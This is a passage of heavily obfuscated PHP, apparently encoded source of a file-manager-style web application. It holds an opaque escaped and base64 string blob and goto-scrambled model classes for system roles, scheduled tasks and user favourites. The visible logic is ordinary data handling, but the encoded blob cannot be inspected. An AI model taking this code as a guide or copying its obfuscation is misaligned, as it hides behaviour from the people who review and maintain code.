41\24\166\162\147\265\304\130"."\200\30\256\31\107\306\10\11\50\177\51\156\300\166\16\43\50\65\42\271\62\122\210\263\43\157\333\16\115\125\46\45\161\227\244\212\217\260\2\144\53\13\173\140\210"."\151\240\132\350\104\215\367\114\54\202\276\131\124\4\247\301\235\215\153\110\212\51\6\20\106\340\120\15\236\122\342\123\50\111\30\321\4\335\170\311\305\332\174\76\110"."\x24\xa1\x4f\xa1\x5a\x54\xce\xea\xb1\xce\x71\xd5\x38\x2c\x2a\x4f\x92\xad\x91\x8c\x2f\x64\x1e\x5\x34\x80\x2c\x2e\xa5\x60\x44\x51\x8a\xe4\xe3\x79\x34\xe1\x5d\x16\x64\xa7\xca\x8d\x6"."\221\341\55\233\117\144\241\313\142\272\260\343\50\114\211\12\131\273\212\144\205\137\356\142\335\52\230\241\255\124\72\36\41\230\334\140\121\62\263\145\0\53\303\232\116".strrev('GèÈhª^ócR_†À{'."\r".' ××ï¨›ÿEI^!*Ø3(°<ì-fS|').base64_decode('NQYsvuh2MUVLYk5C3kGpqITmJJYDhJY+ZhYAZrIT7o9MB84QIzSVIadhiWAF')."\22\113\151\6\142\271\172\24\142\31\302\4\337\326\346\126\67\3\325\323\141\142\6\236\104\152\342\57\153\20\115\52\142\232\321\3\306\135\353\41\13\314\133\303\164"."\x6a\xe8\x83\x7d\x3d\x59\x35\x21\x5\x42\x4d\x7e\xaf\x27\xd0\xe0\x8f\xcc\x92\x3a\x14\x53\x78\x13\x13\xe9\x46\x5b\x97\x3b\x3a\x7\xc2\x93\x43\x31\x3f\xce\x5c\xae\xc2\xa0\x33\xe\xd8"."\102\147\222\261\303\6\147\174\5\125\33\301\377\270\265\132\214\243\212\136\124\43\140\243\263\126\202\200\312\300\323\255\22\271\63\374\200\107\310\234\327\225\342\374\175"."\12\172\165\217\267\130\50\120\50\321\32\222\277\364\27\300\22\261\346\6\233\265\222\33\254\361\152\256\133\65\124\116\34\150\211\76\261\166\176\176\247\63\107\301\302"."\240\47\105\137\300\174\260\361\127\104\353\173\273\354\51\346\20\65\50\361\64\211\216\67\362\364\300\232\74\50\301\275\64\243\250\340\77\73\257\313\252\241\10\0\354".base64_decode('yHl0JY0JTjpI6Rgug2Fh+Ard/7hyNckdbtiapibpNTdTgMfeUr3imxi0CUVO').base64_decode('vv+ju3CH8CIrsjKnaonoKU5yAcEud2P4IVUcddtVF5GD0lxC78uLtybuJH2O').base64_decode('hUpu0H+Ij56HwojwjIWWTGS0QpIXJh+DrcECDBCn4GUCZXTpUQVY72RWLHeI').strrev('i¼Ù|>@ŸáÕ5i)q'."\n".'©Z¤gŠ\\IÊ×ƒLj€ßEtËË:Mvè¿6')."\x91\xd1\x88\x46\x2d\x6\x21\x5e\x84\xcb\x31\x50\x3\x43\xcb\xf6\x15\x1\x2c\x2\x7e\x80\x36\x83\xa9\x6e\x41\x3f\xbc\xb9\x94\x26\xf6\x1a\x91\x43\xb0\xab\xe0\x57\x19\xa0\x6\x33\xe"."\141\41\320\1\330\162\305\54\366\5\216\353\31\264\122\303\276\241\160\346\6\220\210\110\132\353\261\276\332\0\41\2\53\143\41\321\326\157\301\24\1\265\221\175\246".base64_decode('YO1Cf+EhvcUJu1D7SPzTTn4pzbdXjVc5aUolm2qv5WFcAdCicLkMlYLX4XKO')."\x11\x31\xe2\x5\x9d\xbd\xce\xc0\x17\x1b\x4d\x13\x30\x8\xbd\x3\xd0\x30\x48\x51\x1b\x58\xb2\xba\x65\xe6\xde\xae\xf9\x7e\x64\xf5\x50\xcc\x2e\xc0\x98\x72\x14\x52\x52\x13\xfd\x4d\x47"."\xb5\xa8\xdc\xe1\xc0\x9c\x10\xa4\x47\x3c\x56\xdf\x27\x86\x45\x25\x41\xd4\x69\x90\x48\x4f\x48\x92\xc\x3\xa6\xb\x19\xe8\x43\xa\x49\x7\xf2\xf2\x8f\xa9\x92\xfd\x25\x9\x61\xb9\x30"."\122\47\226\356\310\150\161\71\23\306\132\65\26\345\165\35\110\61\114\147\316\222\15\203\334\162\76\77\350\11\74\6\222\323\370\102\316\217\315\237\54\120\135\220\222".base64_decode('RDVNfO/ALT9IdvC1VnzRQLotVkkve9APlKMahVfZ3MWXQ1Drh6x2UT2O3Nm5')."\x44\x31\x86\x64\x90\xa6\x49\x7c\x82\x2d\xb\x14\x22\x4\x5c\xf5\x28\x80\x56\xbd\xc8\xf6\xfe\xa\x94\xe1\xa1\xf5\xad\x11\x8c\xb0\xe8\xa7\x41\x49\x31\x19\x0\xc6\xb9\x84\x28\xda\x7f"."\xf2\x3b\x64\xfb\xfb\x6\xf4\x33\xec\xb1\x6\x7\xee\x19\x7f\x2f\x7\x3f\xcd\xe0\x60\xcf\x30\x38\xf0\xb\xc\xe\xf2\xf8\x82\x83\x5b\xf0\xfc\xda\x73\x25\xfc\x99\x25\xeb\xdb\x4c\xb0"."\315\114\237\254\210\31\267\363\341\154\250\154\5\302\366\201\213\152\305\347\152\374\112\54\127\310\362\133\110\20\261\312\45\105\35\26\172\130\320\63\16\164\41\350\240"."\356\116\154\303\301\173\45\316\114\211\61\374\317\165\140\265\102\44\154\44\255\124\247\146\132\134\247\227\54\366\154\252\5\353\200\210\317\225\335\261\337\245\42\237\357"."\363\263\311\261\343\46\114\21\205\172\76\77\374\362\202\70\126\43\376\257\310\15\12\331\300\371\304\113\3\26\264\222\250\317\47\161\371\242\104\253\342\147\361\143\51"."\2\212\132\111\362\377\154\51\160\26\31\147\25\24\62\213\137\202\52\32\22\204\225\202\362\202\260\241\331\256\236\65\170\43\154\360\306\342\55\214\77\226\142\375\26"."\176\332\247\104\77\370\147\205\245\201\337\341\320\62\120\330\204\57\335\103\227\25\126\251\251\224\160\200\106\202\112\42\52\172\112\114\261\267\35\15\14\71\126\340\311".strrev('w¶$%{¹è”!+ƒ` *@›¿öEò*šmË”.HèTnX3öjhÖ ô‚')."\114\154\17\121\375\112\273\61\323\305\204\41\247\114\337\106\101\223\52\234\243\51\146\10\115\60\216\12\262\231\265\257\266\352\101\61\136\307\42\207\64\130\246\142\56".base64_decode('THi3hftuEFguWJpaSQ0i2lJqxd+iQIYv/GgarVXLuhV8qol2JKgicRkUV41O')."\x4b\x48\x7b\xc9\xc2\x45\x6f\x7a\x23\x6d\xd\x4f\x13\xb3\x16\x92\x5\x1d\x11\x38\x74\xc2\x5b\x44\x9a\x18\xb6\x1a\xde\x86\xa8\x77\x2c\xc0\x24\x59\xc4\x2e\x10\x6f\xb0\x3d\x57\x85\x88".base64_decode('j/0NK9p/tM45TRPMzizcP3u0wSINGPbXSwA7JbqSA1GG4WTzJFQPaejirzns')."\57\230\345\5\33\133\333\3\207\302\301\245\365\351\302\264\330\54\350\145\300\266\254\251\335\37\64\243\304\267\51\70\3\366\75\206\303\224\23\377\177\176\321\354\377"."\xd7\x43\x66\x13\xaa\xe8\x11\xb3\xe5\xb5\xab\x26\xc2\xe0\x92\xd6\xc2\xdb\x1e\x26\xaa\xe3\xe3\x4d\x5b\x3f\xac\x5b\xe4\x10\x31\x95\x60\xa8\xc3\x12\x23\x11\xbe\xe0\xe0\xde\xe3\xb2\xbd"."\342\350\142\52\213\324\53\5\165\126\41\323\353\23\31\276\337\122\164\134\111\337\75\2\30\331\311\236\345\51\25\51\176\224\316\202\174\224\337\344\315\314\251\211\316"."\22\327\161\160\12\2\126\167\174\2\227\120\224\215\323\47\300\114\120\77\34\156\32\112\100\61\13\262\222\224\54\212\126\146\241\74\25\310\52\11\45\136\64\203\222".base64_decode('D2SqSqiISDksoCJ6E7XsghagODz88UWX9S1BUqLF9uoMzmTx1Wg5Wy6+nS0u')."\xcd\x16\xb3\x58\x4\xaa\x70\x5a\x4f\x68\xd8\x3\x76\x55\xf6\x17\xed\xaa\x9d\xc5\x1f\xc3\x1a\xd4\xf0\x3c\x21\xc\x25\x7e\x8a\x90\xe8\xfa\x1\x5d\xf\x96\x28\x83\x97\x65\x84\xe7\x19"."\x4\xfd\x4b\x2f\x42\xf6\xfc\xa0\x20\x8\x83\x90\xd8\x5f\xba\x98\x5b\x75\xd\xb1\x62\x56\x28\x3b\xd5\x10\xd4\xe1\x84\xd7\xd4\x8a\x5e\x78\xb2\x1d\xe3\x3\xf1\x88\xdf\x6b\xa9\x1a\x72"."\253\111\272\35\151\153\251\100\106\0\4\123\1\167\57\274\132\152\146\363\370\354\213\64\32\133\331\130\116\232\14\321\123\256\325\30\107\320\156\265\46\100\165\144\353"."\112\231\136\52\133\102\323\15\41\33\203\227\312\13\37\321\62\55\243\311\175\235\332\175\234\42\121\30\113\267\26\41\227\134\42\212\40\341\216\15\260\267\111\253\122"."\x24\x4a\x44\x60\xea\xdb\x89\x3e\x62\xcb\x6f\x89\xac\x97\x74\xcc\xe1\x64\x11\xa5\x2a\xa8\x1\x21\x19\x95\xa2\xde\x41\xc0\x2f\xb4\x39\xf2\x73\x43\x6c\x94\x8c\xcf\xb6\x3d\xdd\xb2\x49"."\257\272\354\245\332\54\262\204\160\245\227\100\270\343\53\276\265\341\227\111\302\346\117\213\101\141\204\323\132\33\134\40\376\234\332\311\335\374\242\206\163\277\311\44\173"."\27\321\222\225\275\213\316\240\0\302\237\120\204\274\216\140\306\310\225\141\225\36\373\123\135\56\321\364\321\222\261\30\312\315\34\355\375\102\153\201\301\311\175\131\116".base64_decode('UDIg2MJB2J8t0z8RRAio0M0VU3AbmYDMP2m1xmTZ2GSAPEh93mmB2oQieNxA')."\367\147\133\222\41\276\345\150\275\202\23\45\166\141\156\225\114\100\250\116\274\236\33\264\100\244\364\107\70\272\131\207\130\260\134\345\11\164\27\22\153\261\120\61\326"."\x31\x92\x33\x2c\x26\x5a\x9a\x63\x9f\x5a\xc4\xcf\x73\xbc\xc4\xc0\x2c\x3a\xd1\x74\xd1\x13\xe2\xe2\xfc\x8a\xad\xf5\x62\x1\x7b\xcf\x70\x9\xa3\x47\x35\x13\x69\x41\xc8\x28\x4e\x2c\x86"."\353\105\203\112\76\124\272\275\366\126\321\61\265\213\136\274\222\242\366\10\167\374\121\255\104\31\334\242\222\305\160\22\172\161\230\61\207\226\262\203\14\1\54\213\223".strrev('º_¼‘¹ìãsø¹™,ñ°uœ\\„Û‰d÷ÄGƒÅ{¤Ár™Ê³8XZd¢Ù`').base64_decode('XEy33aOWakXJzIO2osQrqsQDVgkiSlNKkE1+6V5MoHlaCRUAXCfcfEU3LCWS')."\105\175\202\322\32\7\341\222\113\337\260\252\2\330\340\342\300\160\115\42\242\133\324\231\243\106\30\240\70\327\316\202\312\227\354\171\115\126\337\0\141\275\154\252\254".base64_decode('FPdyBUGrsqQurAM9vlwkg2ZkesYtqBFjeUMz1YSgb2R/bhqn049khKMz26kV')."\227\323\55\367\314\45\316\165\20\10\7\135\374\270\330\242\124\215\167\156\162\116\216\257\313\274\360\356\224\135\221\100\301\310\201\67\104\234\14\337\277\166\300\264\250"."\x96\x47\xbf\xf5\x9a\x69\x52\x52\x1\x24\x77\xdb\xd3\xf4\x82\xae\x1\x8\xf1\xfb\x10\x38\x8a\xe8\x88\x1e\xe1\x1b\xa2\xb\x28\x48\x2e\xee\xa0\xa8\x18\x51\x70\x2a\xa2\x26\x96\x8\x3c".strrev('†³@œÔMğOã~0YÛ)Ê¿‡·“–Ğe÷Rõ®/ñ'."\0".'!•Ûm·"Óqgú')."\xa7\xb8\x89\xf\x58\x27\xaa\xc3\x49\x7c\x87\x2c\xcd\x77\x58\x8a\x63\x37\xf4\x4c\x63\xf0\xd7\x6a\x20\xa7\x8a\xbc\xa\xec\x1b\x12\x1d\x8\x41\x2f\xa9\xbe\x79\xfe\x48\x34\x52\x94\xd4".base64_decode('6olE5obCDdiVZFEyKiUoqRQltTaHgoOl+Vo8/kBRGlRaCca4xxuc5G9FrfQE').base64_decode('AqG5g7XC753FW4IuRfmxdT6t0TNoerofkTNUChZsvJQsd33Ey1iFe3FeDeoD')."\214\5\254\16\327\155\372\143\24\141\111\105\120\341\44\110\352\16\347\11\24\272\326\144\213\233\261\271\250\103\232\115\257\35\137\373\272\54\167\305\2\34\55\26\341".base64_decode('fXcsBwjbJwKMLjli4sln8Uk8SuUjAls6UyMqTku1uHDSjqUOYmxFxljQMsJh')."\222\374\177\1\17\106\252\52\260\232\0\0".""."", 10, -8))); goto bÅÎÊ–øÔ; cØ‹¾ÃÙêÏ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\162\x6f\154\145\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\150", "\x6c\x61\x62\145\x6c", "\144\151\163\160\154\141\x79", "\x73\x79\163\164\x65\155", "\x64\145\x73\x63", "\151\x67\x6e\x6f\x72\145\x45\170\x74", "\x69\x67\x6e\157\162\145\x46\151\154\145\x53\x69\172\145", "\x61\x64\155\x69\x6e\x69\163\164\x72\x61\164\x6f\162", "\163\x6f\162\164"); public function listData($Aø¾ğÚğÓß = false, $fÑÁÕÄÆ = "\163\x6f\x72\164", $a»–Ö¯ˆËÖ = false) { $f¬çÔ°Ìô½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e–Á­«Ø· = parent::listData($Aø¾ğÚğÓß, $fÑÁÕÄÆ, $a»–Ö¯ˆËÖ); if (!$Aø¾ğÚğÓß) { foreach ($e–Á­«Ø· as $B·È¿—ÃšĞ => $A§‰Ö³òÒÖ) { if ($A§‰Ö³òÒÖ[$f¬çÔ°Ìô½[1840]] == 1) { $e–Á­«Ø·[$B·È¿—ÃšĞ][$f¬çÔ°Ìô½[434]] = LNG($f¬çÔ°Ìô½[2062]); } } } return $e–Á­«Ø·; } public function update($eÓæê†Û»Ù, $DŠÚÆ‹å£­) { goto EÉ²ŸÌá¼¶; eİÏÕ®¿ç: return parent::update($eÓæê†Û»Ù, $DŠÚÆ‹å£­); goto bò¬´²¸ë; EÉ²ŸÌá¼¶: $D¶»Ÿ³¡Æ« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bæšá“‰ƒ = parent::listData($eÓæê†Û»Ù); $B¾ğ÷¨Œƒ· = $this->findByName($DŠÚÆ‹å£­[$D¶»Ÿ³¡Æ«[28]]); goto dÂ¥Å„ˆÁ; dÂ¥Å„ˆÁ: if (!$bæšá“‰ƒ || $B¾ğ÷¨Œƒ· && $B¾ğ÷¨Œƒ·[$D¶»Ÿ³¡Æ«[397]] != $bæšá“‰ƒ[$D¶»Ÿ³¡Æ«[397]]) { return !1; } if ($B¾ğ÷¨Œƒ·[$D¶»Ÿ³¡Æ«[1840]] == 1) { $DŠÚÆ‹å£­ = array($D¶»Ÿ³¡Æ«[28] => $DŠÚÆ‹å£­[$D¶»Ÿ³¡Æ«[28]], $D¶»Ÿ³¡Æ«[1671] => $DŠÚÆ‹å£­[$D¶»Ÿ³¡Æ«[1671]]); } $this->filterAuth($DŠÚÆ‹å£­[$D¶»Ÿ³¡Æ«[409]]); goto eİÏÕ®¿ç; bò¬´²¸ë: } public function remove($CŸì‘Õ±©) { $E®‹ÅÚŠ = parent::listData($CŸì‘Õ±©); if (!$E®‹ÅÚŠ || $E®‹ÅÚŠ[$_SERVER[í¤âËÚ£¶íÊ¢][1129]]) { return !1; } return parent::remove($CŸì‘Õ±©); } public function add($FŞÂõŠ™êÄ) { goto cÆ´Ÿ¿ŠŸ…; b‰× á‹‰Ë: return parent::insert($FŞÂõŠ™êÄ); goto EÀ« ™¨Í; e‚„­Ûàˆ¢: $cÕÉò¼À¨” = array($cò“¥¤‘„Â[416] => $F“°š Ëª, $cò“¥¤‘„Â[1656] => $cò“¥¤‘„Â[33], $cò“¥¤‘„Â[1652] => $cò“¥¤‘„Â[1660], $cò“¥¤‘„Â[2063] => 1, $cò“¥¤‘„Â[1655] => 0, $cò“¥¤‘„Â[2064] => 0, $cò“¥¤‘„Â[1654] => $this->getSort()); $FŞÂõŠ™êÄ = array_merge($cÕÉò¼À¨”, $FŞÂõŠ™êÄ); $this->filterAuth($FŞÂõŠ™êÄ[$cò“¥¤‘„Â[409]]); goto b‰× á‹‰Ë; cÆ´Ÿ¿ŠŸ…: $cò“¥¤‘„Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F“°š Ëª = $FŞÂõŠ™êÄ[$cò“¥¤‘„Â[28]]; if ($this->findByName($F“°š Ëª)) { return !1; } goto e‚„­Ûàˆ¢; EÀ« ™¨Í: } private function getSort() { $B‡À˜ÈåÔ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eË×§¾Ö¢ = parent::listData(); $d‹££·æ¢ = array_to_keyvalue($eË×§¾Ö¢, $B‡À˜ÈåÔ[33], $B‡À˜ÈåÔ[1673]); return empty($d‹££·æ¢) ? 0 : max($d‹££·æ¢) + 1; } private function filterAuth(&$b…ß÷‘¿Û) { $Cª«Æò‚¬ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eØœìŠ»¯ = array(); $B³ƒ•ĞÊØ” = array_filter(explode($Cª«Æò‚¬ô[47], $b…ß÷‘¿Û)); foreach ($B³ƒ•ĞÊØ” as $b…ß÷‘¿Û) { $Aâˆ«“¤¬ = explode($Cª«Æò‚¬ô[104], $b…ß÷‘¿Û); if ($Aâˆ«“¤¬[0] == $Cª«Æò‚¬ô[2065] && $Aâˆ«“¤¬[1] != $Cª«Æò‚¬ô[1050]) { $cÈŞ´´Ùƒ• = $Aâˆ«“¤¬[0] . $Cª«Æò‚¬ô[104] . $Aâˆ«“¤¬[1] . $Cª«Æò‚¬ô[2066]; if (!in_array($cÈŞ´´Ùƒ•, $B³ƒ•ĞÊØ”)) { $eØœìŠ»¯[] = $cÈŞ´´Ùƒ•; } } $eØœìŠ»¯[] = $b…ß÷‘¿Û; } $b…ß÷‘¿Û = implode($Cª«Æò‚¬ô[47], $eØœìŠ»¯); } public function sort($A¦¹ê«Ë˜¦, $CæŠ•—ôï ) { return parent::update($A¦¹ê«Ë˜¦, $CæŠ•—ôï ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x74\x61\x73\153\x4c\151\163\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\160\x65", "\145\x76\145\x6e\164", "\164\x69\155\x65", "\x64\x65\x73\x63", "\163\x79\163\164\145\x6d", "\x65\156\141\142\x6c\x65", "\x6c\x61\163\164\x52\165\156", "\x73\157\x72\164"); public function listData($CÎÛë¶Œ£Ä = false, $eŞ¬»İèˆß = "\163\x6f\x72\164", $a“Äæ…‡í = false) { return parent::listData($CÎÛë¶Œ£Ä, $eŞ¬»İèˆß, $a“Äæ…‡í); } public function add($e­ÊÍšô) { $fÄ“©Š©– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aç¬§ëË´ = $this->findByName($e­ÊÍšô[$fÄ“©Š©–[28]]); if ($aç¬§ëË´) { return !1; } $e­ÊÍšô[$fÄ“©Š©–[1452]] = 0; $e­ÊÍšô[$fÄ“©Š©–[1673]] = $this->getSort(); return parent::insert($e­ÊÍšô); } private function getSort() { $EÃ…Ôïª»Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a¯õôÜ‘ˆÁ = parent::listData(); $FğíÚ³÷– = array_to_keyvalue($a¯õôÜ‘ˆÁ, $EÃ…Ôïª»Ù[33], $EÃ…Ôïª»Ù[1673]); return empty($FğíÚ³÷–) ? 0 : max($FğíÚ³÷–) + 1; } public function update($A­šÚÒëé½, $fŒ”›‚¥Â¤) { $Eõ‚¨ãÎä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Béö’œÀ†† = $this->listData($A­šÚÒëé½); $dÁÆó¼£ó• = $this->findByName($fŒ”›‚¥Â¤[$Eõ‚¨ãÎä[28]]); if (!$Béö’œÀ†† || $dÁÆó¼£ó• && $dÁÆó¼£ó•[$Eõ‚¨ãÎä[397]] != $Béö’œÀ††[$Eõ‚¨ãÎä[397]]) { return !1; } return parent::update($A­šÚÒëé½, $fŒ”›‚¥Â¤); } public function remove($e²”±È”Å, $fŞÁ«–åÑª = false) { $BÑŠ©àŒ“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D£æÙâˆù = $this->listData($e²”±È”Å); if (!$D£æÙâˆù) { return; } if (!$fŞÁ«–åÑª && $D£æÙâˆù[$BÑŠ©àŒ“[1129]] == $BÑŠ©àŒ“[96]) { return !1; } return parent::remove($e²”±È”Å); } public function enable($aâ‹ÊËŸ±à, $c‰ø¾èŠ•¥) { return $this->update($aâ‹ÊËŸ±à, array($_SERVER[í¤âËÚ£¶íÊ¢][2057] => $c‰ø¾èŠ•¥)); } public function run($AŞ¤Œµ´Å¬) { return $this->update($AŞ¤Œµ´Å¬, array($_SERVER[í¤âËÚ£¶íÊ¢][2067] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($bó…Âùâ¤¾) { $EµÁ‰’¥÷Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($EµÁ‰’¥÷Â[1753] => array(USER_ID, $EµÁ‰’¥÷Â[2068])); } protected function listData() { $DÉ¹İØ«†ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f÷õÓœÎ‘“ = array($DÉ¹İØ«†ã[1479] => USER_ID, $DÉ¹İØ«†ã[466] => 0); $aÓÁàƒ´—„ = $DÉ¹İØ«†ã[2069]; $Bˆå›–Â¶º = $this->field($aÓÁàƒ´—„)->where($f÷õÓœÎ‘“)->order($DÉ¹İØ«†ã[2070])->select(); return $Bˆå›–Â¶º ? $Bˆå›–Â¶º : array(); } protected function resetCache() { } protected function listView() { goto c÷‘¢Æ¨©İ; c÷‘¢Æ¨©İ: $cŞ’ç¬Û§Ÿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dçÀ˜‘ß = $this->listData(); $DÖ“Öª×µŸ = array_filter_by_field($dçÀ˜‘ß, $cŞ’ç¬Û§Ÿ[29], $cŞ’ç¬Û§Ÿ[412]); goto A¥ã–öêÎ; FğöÕ¬á›: $A«¸»Û²½Œ = array($cŞ’ç¬Û§Ÿ[413] => array($cŞ’ç¬Û§Ÿ[414], $AõÕ„Ê‚šá)); $aÕ…˜Œ‚µÜ = Model($cŞ’ç¬Û§Ÿ[759])->listSource($A«¸»Û²½Œ, $dÂ…Æø¾³); $aÕ…˜Œ‚µÜ = array_merge($aÕ…˜Œ‚µÜ[$cŞ’ç¬Û§Ÿ[83]], $aÕ…˜Œ‚µÜ[$cŞ’ç¬Û§Ÿ[84]]); goto BÃò£ªáè; A¥ã–öêÎ: $AõÕ„Ê‚šá = array_to_keyvalue($DÖ“Öª×µŸ, $cŞ’ç¬Û§Ÿ[33], $cŞ’ç¬Û§Ÿ[85]); if (!$AõÕ„Ê‚šá) { return $dçÀ˜‘ß; } $dÂ…Æø¾³ = 2000; goto FğöÕ¬á›; BÃò£ªáè: $aÕ…˜Œ‚µÜ = array_to_keyvalue($aÕ…˜Œ‚µÜ, $cŞ’ç¬Û§Ÿ[399]); foreach ($dçÀ˜‘ß as $B³‘¯µ½‚­ => $C•Ù×ôà³¶) { $cäŠ¥§Ë™° = $aÕ…˜Œ‚µÜ[$C•Ù×ôà³¶[$cŞ’ç¬Û§Ÿ[85]]]; $cäŠ¥§Ë™° = $cäŠ¥§Ë™° ? $cäŠ¥§Ë™° : array(); $dçÀ˜‘ß[$B³‘¯µ½‚­] = array_merge($cäŠ¥§Ë™°, $C•Ù×ôà³¶); } return $dçÀ˜‘ß; goto A‡ÄÀ©İÛŸ; A‡ÄÀ©İÛŸ: } protected function addFav($a²¹ÆÇÙÚ, $cÅ“½Óùó = '', $dĞ¿…Ü×­Û = "\x73\157\165\162\143\145") { goto c¦Üà’…Ë; eÄè¯‹£Ò³: if (!$cÅ“½Óùó && $dĞ¿…Ü×­Û == $a¦Ó“·Ñ‚Ø[412]) { $F¾ù£õŠÎ• = Model($a¦Ó“·Ñ‚Ø[1164])->where(array($a¦Ó“·Ñ‚Ø[413] => $a²¹ÆÇÙÚ))->find(); if (!$F¾ù£õŠÎ•) { return !1; } $cÅ“½Óùó = $F¾ù£õŠÎ•[$a¦Ó“·Ñ‚Ø[28]]; } $cÅ“½Óùó = $this->getAutoName($cÅ“½Óùó); $B÷Šä×äôÌ = array($a¦Ó“·Ñ‚Ø[1479] => USER_ID, $a¦Ó“·Ñ‚Ø[466] => 0, $a¦Ó“·Ñ‚Ø[416] => $cÅ“½Óùó, $a¦Ó“·Ñ‚Ø[417] => $a²¹ÆÇÙÚ, $a¦Ó“·Ñ‚Ø[418] => $dĞ¿…Ü×­Û, $a¦Ó“·Ñ‚Ø[1654] => $døŸ÷‘İ£· + 1); goto CéÄÌš°; A…Íä‰‚¼Š: $e¯·Ê¦»ê» = array($a¦Ó“·Ñ‚Ø[1479] => USER_ID, $a¦Ó“·Ñ‚Ø[466] => 0); $døŸ÷‘İ£· = $this->where($e¯·Ê¦»ê»)->max($a¦Ó“·Ñ‚Ø[1673]); if (!$døŸ÷‘İ£·) { $døŸ÷‘İ£· = 0; } goto eÄè¯‹£Ò³; CéÄÌš°: return $this->add($B÷Šä×äôÌ); goto Cš‡«ù¶Õõ; c¦Üà’…Ë: $a¦Ó“·Ñ‚Ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¯·Ê¦»ê» = array($a¦Ó“·Ñ‚Ø[1479] => USER_ID, $a¦Ó“·Ñ‚Ø[466] => 0, $a¦Ó“·Ñ‚Ø[418] => $dĞ¿…Ü×­Û, $a¦Ó“·Ñ‚Ø[417] => $a²¹ÆÇÙÚ); if ($this->where($e¯·Ê¦»ê»)->find()) { return !1; } goto A…Íä‰‚¼Š; Cš‡«ù¶Õõ: } protected function remove($D¼–Õ×‹Ã) { $Bè¬š¦ì† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c™®Ş‹ÍÉ = array($Bè¬š¦ì†[1479] => USER_ID, $Bè¬š¦ì†[415] => $D¼–Õ×‹Ã); return $this->where($c™®Ş‹ÍÉ)->delete(); } protected function removeByName($D¥×¹‚¬¿) { $BóÆÌæ™õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¥…Åëˆ¨À = array($BóÆÌæ™õ[1479] => USER_ID, $BóÆÌæ™õ[416] => $D¥×¹‚¬¿, $BóÆÌæ™õ[466] => 0); return $this->where($F¥…Åëˆ¨À)->delete(); } protected function rename($aÖ³õçÖ, $b¡¤°¥„Ãí) { $a¼¿‹÷ßŞƒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($aÖ³õçÖ == $b¡¤°¥„Ãí) { return !1; } $A˜‡Ï¨‰Ş‚ = $this->getAutoName($b¡¤°¥„Ãí); if ($b¡¤°¥„Ãí != $A˜‡Ï¨‰Ş‚) { return !1; } $B•š»ò©¾¤ = array($a¼¿‹÷ßŞƒ[1479] => USER_ID, $a¼¿‹÷ßŞƒ[466] => 0, $a¼¿‹÷ßŞƒ[28] => $aÖ³õçÖ); return $this->where($B•š»ò©¾¤)->save(array($a¼¿‹÷ßŞƒ[28] => $b¡¤°¥„Ãí)); } protected function resetSort($A‡ŒÃ Ãêğ) { $CÊÛäëçõ¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A‡ŒÃ Ãêğ = is_array($A‡ŒÃ Ãêğ) ? $A‡ŒÃ Ãêğ : array(); $Cõó½öËÅƒ = array($CÊÛäëçõ¦[1479] => USER_ID); for ($fŞÙ¦ó Íò = 0; $fŞÙ¦ó Íò < count($A‡ŒÃ Ãêğ); $fŞÙ¦ó Íò++) { $Cõó½öËÅƒ[$CÊÛäëçõ¦[415]] = $A‡ŒÃ Ãêğ[$fŞÙ¦ó Íò]; $this->where($Cõó½öËÅƒ)->save(array($CÊÛäëçõ¦[1654] => $fŞÙ¦ó Íò + 1)); } return !0; } protected function moveTop($bÜà…à”ÍŠ) { goto fòàœÌÀ™; fÅÅõßˆàö: return $this->resetSort($bˆÑ¢É†”ô); goto eªãñ —; E©‰¶¼¬˜À: if (!$FµÑô…ñğ) { return; } $bˆÑ¢É†”ô = $this->field($EùÃ£¡İ‰É[397])->where($CèÀÛØ£³Ñ)->order($EùÃ£¡İ‰É[2070])->select(); $bˆÑ¢É†”ô = array_to_keyvalue($bˆÑ¢É†”ô, $EùÃ£¡İ‰É[33], $EùÃ£¡İ‰É[397]); goto Cï»µÀ¥£ù; Cï»µÀ¥£ù: $DªÄ¼ÛÇó‡ = $bˆÑ¢É†”ô; $bˆÑ¢É†”ô = array_remove_value($bˆÑ¢É†”ô, $FµÑô…ñğ[$EùÃ£¡İ‰É[397]]); array_unshift($bˆÑ¢É†”ô, $FµÑô…ñğ[$EùÃ£¡İ‰É[397]]); goto fÅÅõßˆàö; fòàœÌÀ™: $EùÃ£¡İ‰É =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CèÀÛØ£³Ñ = array($EùÃ£¡İ‰É[1479] => USER_ID, $EùÃ£¡İ‰É[466] => 0); $FµÑô…ñğ = $this->where($CèÀÛØ£³Ñ)->where(array($EùÃ£¡İ‰É[28] => $bÜà…à”ÍŠ))->find(); goto E©‰¶¼¬˜À; eªãñ —: } protected function moveBottom($dˆ†¹¨ÕËø) { $FİŠ…ùèÓĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÔò©¢æÂõ = array($FİŠ…ùèÓĞ[1479] => USER_ID, $FİŠ…ùèÓĞ[466] => 0); $b°ò†ÇµÔ§ = $this->where($aÔò©¢æÂõ)->max($FİŠ…ùèÓĞ[1673]); $b¶Ô¼ˆ–„ = array($FİŠ…ùèÓĞ[1673] => $b°ò†ÇµÔ§ + 1); return $this->where($aÔò©¢æÂõ)->where(array($FİŠ…ùèÓĞ[28] => $dˆ†¹¨ÕËø))->save($b¶Ô¼ˆ–„); } private function getAutoName($E‚ÆŞ †¹¦) { goto 